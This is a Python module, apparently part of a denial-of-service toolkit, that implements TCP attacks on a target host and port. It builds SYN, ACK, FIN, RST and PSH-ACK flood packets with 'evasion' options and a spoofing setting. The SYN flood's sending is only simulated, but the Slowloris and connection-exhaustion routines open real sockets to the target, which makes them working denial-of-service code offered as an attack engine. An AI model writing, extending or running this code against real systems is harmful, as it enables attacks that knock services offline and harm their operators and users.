#!/usr/bin/env python3
"""
TCP Engine - High-performance TCP attack implementation
Provides optimized TCP-based attack vectors with advanced evasion techniques
"""

import asyncio
import logging
import socket
import time
import random
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import struct

try:
    from scapy.layers.inet import IP, TCP
    from scapy.volatile import RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logging.warning("Scapy not available, TCP engine will use limited functionality")

from .socket_factory import SocketFactory, SocketType

logger = logging.getLogger(__name__)

class TCPAttackType(Enum):
    SYN_FLOOD = "syn_flood"
    ACK_FLOOD = "ack_flood"
    FIN_FLOOD = "fin_flood"
    RST_FLOOD = "rst_flood"
    PUSH_ACK_FLOOD = "push_ack_flood"
    SLOWLORIS = "slowloris"
    CONNECTION_EXHAUSTION = "connection_exhaustion"


@dataclass
class TCPAttackConfig:
    """Configuration for TCP attacks"""
    target: str = "127.0.0.1"
    port: int = 80
    enable_spoofing: bool = False
    spoofing_rate: float = 0.3
    max_connections: int = 1000
    connection_timeout: float = 10.0
    packet_size: int = 1460
    attack_type: TCPAttackType = TCPAttackType.SYN_FLOOD


@dataclass
class TCPPacketOptions:
    """TCP packet options for evasion"""
    window_size: int = 65535
    mss: int = 1460
    window_scale: int = 7
    timestamp: bool = True
    sack_permitted: bool = True
    nop_padding: bool = True

class TCPEngine:
    """High-performance TCP attack engine"""
    
    def __init__(self, config: TCPAttackConfig = None):
        self.config = config or TCPAttackConfig()
        self.socket_factory = SocketFactory()
        self.active_connections = {}
        self.packet_cache = {}
        self.stats = {
            'packets_sent': 0,
            'connections_made': 0,
            'errors': 0
        }
        
        logger.info("TCP Engine initialized")
    
    async def initialize(self):
        """Initialize TCP engine"""
        try:
            await self.socket_factory.initialize()
            
            if not SCAPY_AVAILABLE:
                logger.warning("TCP engine running with limited functionality (no Scapy)")
            
            logger.info("TCP Engine initialization completed")
            
        except Exception as e:
            logger.error(f"TCP Engine initialization failed: {e}")
            raise
    
    async def create_packet(self, target: str, port: int, packet_size: int, 
                          attack_type: TCPAttackType = TCPAttackType.SYN_FLOOD,
                          options: Optional[TCPPacketOptions] = None) -> bytes:
        """Create optimized TCP packet"""
        try:
            if not SCAPY_AVAILABLE:
                return await self._create_simple_packet(target, port, packet_size, attack_type)
            
            return await self._create_scapy_packet(target, port, packet_size, attack_type, options)
            
        except Exception as e:
            logger.error(f"TCP packet creation failed: {e}")
            self.stats['errors'] += 1
            raise
    
    async def _create_simple_packet(self, target: str, port: int, packet_size: int,
                                  attack_type: TCPAttackType) -> bytes:
        """Create simple TCP packet without Scapy"""
        # Simple TCP header construction
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 2**32 - 1)
        ack_num = 0
        
        # TCP flags based on attack type
        flags = 0
        if attack_type == TCPAttackType.SYN_FLOOD:
            flags = 0x02  # SYN
        elif attack_type == TCPAttackType.ACK_FLOOD:
            flags = 0x10  # ACK
            ack_num = random.randint(0, 2**32 - 1)
        elif attack_type == TCPAttackType.FIN_FLOOD:
            flags = 0x01  # FIN
        elif attack_type == TCPAttackType.RST_FLOOD:
            flags = 0x04  # RST
        elif attack_type == TCPAttackType.PUSH_ACK_FLOOD:
            flags = 0x18  # PSH + ACK
            ack_num = random.randint(0, 2**32 - 1)
        
        # Build TCP header (simplified)
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            src_port,      # Source port
            port,          # Destination port
            seq_num,       # Sequence number
            ack_num,       # Acknowledgment number
            (5 << 4),      # Data offset (5 * 4 = 20 bytes)
            flags,         # Flags
            65535,         # Window size
            0,             # Checksum (will be calculated by kernel)
            0              # Urgent pointer
        )
        
        # Add payload if needed
        payload = b'A' * max(0, packet_size - len(tcp_header))
        
        return tcp_header + payload
    
    async def _create_scapy_packet(self, target: str, port: int, packet_size: int,
                                 attack_type: TCPAttackType, 
                                 options: Optional[TCPPacketOptions] = None) -> bytes:
        """Create TCP packet using Scapy"""
        if options is None:
            options = TCPPacketOptions()
        
        # Create IP layer
        ip_layer = IP(dst=target)
        
        # Create TCP layer based on attack type
        tcp_options = self._build_tcp_options(options)
        
        if attack_type == TCPAttackType.SYN_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="S",
                window=options.window_size,
                options=tcp_options
            )
        elif attack_type == TCPAttackType.ACK_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="A",
                seq=random.randint(0, 2**32 - 1),
                ack=random.randint(0, 2**32 - 1),
                window=options.window_size,
                options=tcp_options
            )
        elif attack_type == TCPAttackType.FIN_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="F",
                seq=random.randint(0, 2**32 - 1),
                window=options.window_size,
                options=tcp_options
            )
        elif attack_type == TCPAttackType.RST_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="R",
                seq=random.randint(0, 2**32 - 1),
                window=0
            )
        elif attack_type == TCPAttackType.PUSH_ACK_FLOOD:
            tcp_layer = TCP(
                sport=RandShort(),
                dport=port,
                flags="PA",
                seq=random.randint(0, 2**32 - 1),
                ack=random.randint(0, 2**32 - 1),
                window=options.window_size,
                options=tcp_options
            )
        else:
            tcp_layer = TCP(sport=RandShort(), dport=port, flags="S")
        
        # Create packet
        packet = ip_layer / tcp_layer
        
        # Add payload if needed
        current_size = len(bytes(packet))
        if packet_size > current_size:
            payload = b'A' * (packet_size - current_size)
            packet = packet / payload
        
        return bytes(packet)
    
    def _build_tcp_options(self, options: TCPPacketOptions) -> List[Tuple]:
        """Build TCP options for evasion"""
        tcp_options = []
        
        # MSS option
        tcp_options.append(('MSS', options.mss))
        
        # Window scale option
        tcp_options.append(('WScale', options.window_scale))
        
        # SACK permitted
        if options.sack_permitted:
            tcp_options.append(('SAckOK', ''))
        
        # Timestamp
        if options.timestamp:
            timestamp = int(time.time() * 1000) % (2**32)
            tcp_options.append(('Timestamp', (timestamp, 0)))
        
        # NOP padding for evasion
        if options.nop_padding:
            tcp_options.append(('NOP', None))
            tcp_options.append(('NOP', None))
        
        return tcp_options
    
    async def syn_flood(self, target: str, port: int, duration: int = 0,
                       packet_size: int = 64, rate_limit: int = 1000) -> Dict[str, Any]:
        """Execute SYN flood attack"""
        logger.info(f"Starting SYN flood against {target}:{port}")
        
        start_time = time.time()
        packets_sent = 0
        
        try:
            while True:
                # Check duration
                if duration > 0 and (time.time() - start_time) >= duration:
                    break
                
                # Create and send SYN packet
                packet = await self.create_packet(
                    target, port, packet_size, TCPAttackType.SYN_FLOOD
                )
                
                # Send packet (simulated - actual sending would require raw sockets)
                await self._simulate_packet_send(packet, target, port)
                
                packets_sent += 1
                self.stats['packets_sent'] += 1
                
                # Rate limiting
                if packets_sent % rate_limit == 0:
                    await asyncio.sleep(0.001)
            
            return {
                'attack_type': 'SYN_FLOOD',
                'target': target,
                'port': port,
                'packets_sent': packets_sent,
                'duration': time.time() - start_time,
                'success': True
            }
            
        except Exception as e:
            logger.error(f"SYN flood failed: {e}")
            self.stats['errors'] += 1
            return {
                'attack_type': 'SYN_FLOOD',
                'success': False,
                'error': str(e),
                'packets_sent': packets_sent
            }
    
    async def slowloris(self, target: str, port: int, duration: int = 60,
                       connections: int = 200) -> Dict[str, Any]:
        """Execute Slowloris attack"""
        logger.info(f"Starting Slowloris against {target}:{port}")
        
        start_time = time.time()
        active_connections = []
        
        try:
            # Create initial connections
            for i in range(connections):
                try:
                    sock = self.socket_factory.create_socket(SocketType.TCP)
                    await asyncio.get_event_loop().sock_connect(sock, (target, port))
                    
                    # Send partial HTTP request
                    request = f"GET / HTTP/1.1\r\nHost: {target}\r\n"
                    await asyncio.get_event_loop().sock_sendall(sock, request.encode())
                    
                    active_connections.append(sock)
                    self.stats['connections_made'] += 1
                    
                except Exception as e:
                    logger.debug(f"Connection {i} failed: {e}")
                    self.stats['errors'] += 1
            
            # Maintain connections
            while (time.time() - start_time) < duration:
                for sock in active_connections[:]:
                    try:
                        # Send keep-alive header
                        header = f"X-a: {random.randint(1, 5000)}\r\n"
                        await asyncio.get_event_loop().sock_sendall(sock, header.encode())
                        
                    except Exception:
                        # Connection lost, remove from list
                        active_connections.remove(sock)
                        try:
                            sock.close()
                        except:
                            pass
                
                await asyncio.sleep(10)  # Send keep-alive every 10 seconds
            
            # Clean up connections
            for sock in active_connections:
                try:
                    sock.close()
                except:
                    pass
            
            return {
                'attack_type': 'SLOWLORIS',
                'target': target,
                'port': port,
                'max_connections': len(active_connections),
                'duration': time.time() - start_time,
                'success': True
            }
            
        except Exception as e:
            logger.error(f"Slowloris attack failed: {e}")
            self.stats['errors'] += 1
            return {
                'attack_type': 'SLOWLORIS',
                'success': False,
                'error': str(e)
            }
    
    async def connection_exhaustion(self, target: str, port: int, 
                                 max_connections: int = 1000) -> Dict[str, Any]:
        """Execute connection exhaustion attack"""
        logger.info(f"Starting connection exhaustion against {target}:{port}")
        
        connections = []
        successful_connections = 0
        
        try:
            for i in range(max_connections):
                try:
                    sock = self.socket_factory.create_socket(SocketType.TCP)
                    await asyncio.get_event_loop().sock_connect(sock, (target, port))
                    
                    connections.append(sock)
                    successful_connections += 1
                    self.stats['connections_made'] += 1
                    
                    # Small delay to avoid overwhelming
                    if i % 100 == 0:
                        await asyncio.sleep(0.1)
                        
                except Exception as e:
                    logger.debug(f"Connection {i} failed: {e}")
                    self.stats['errors'] += 1
                    break
            
            # Hold connections for a while
            await asyncio.sleep(30)
            
            # Clean up
            for sock in connections:
                try:
                    sock.close()
                except:
                    pass
            
            return {
                'attack_type': 'CONNECTION_EXHAUSTION',
                'target': target,
                'port': port,
                'successful_connections': successful_connections,
                'success': True
            }
            
        except Exception as e:
            logger.error(f"Connection exhaustion failed: {e}")
            self.stats['errors'] += 1
            return {
                'attack_type': 'CONNECTION_EXHAUSTION',
                'success': False,
                'error': str(e)
            }
    
    async def _simulate_packet_send(self, packet: bytes, target: str, port: int):
        """Simulate packet sending (for testing without raw sockets)"""
        # In a real implementation, this would send the raw packet
        # For simulation, we just log it
        logger.debug(f"Simulated packet send to {target}:{port}, size: {len(packet)}")
        await asyncio.sleep(0.0001)  # Simulate network delay
    
    async def get_status(self) -> Dict[str, Any]:
        """Get TCP engine status"""
        return {
            'initialized': True,
            'scapy_available': SCAPY_AVAILABLE,
            'active_connections': len(self.active_connections),
            'stats': self.stats.copy()
        }
    
    def get_supported_attacks(self) -> List[str]:
        """Get list of supported attack types"""
        return [attack.value for attack in TCPAttackType]
    
    async def execute_attack(self, attack_type: str, target: str, port: int,
                           **kwargs) -> Dict[str, Any]:
        """Execute specified TCP attack"""
        try:
            attack_enum = TCPAttackType(attack_type.lower())
            
            if attack_enum == TCPAttackType.SYN_FLOOD:
                return await self.syn_flood(target, port, **kwargs)
            elif attack_enum == TCPAttackType.SLOWLORIS:
                return await self.slowloris(target, port, **kwargs)
            elif attack_enum == TCPAttackType.CONNECTION_EXHAUSTION:
                return await self.connection_exhaustion(target, port, **kwargs)
            else:
                return {
                    'success': False,
                    'error': f"Attack type {attack_type} not implemented"
                }
                
        except ValueError:
            return {
                'success': False,
                'error': f"Unknown attack type: {attack_type}"
            }
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }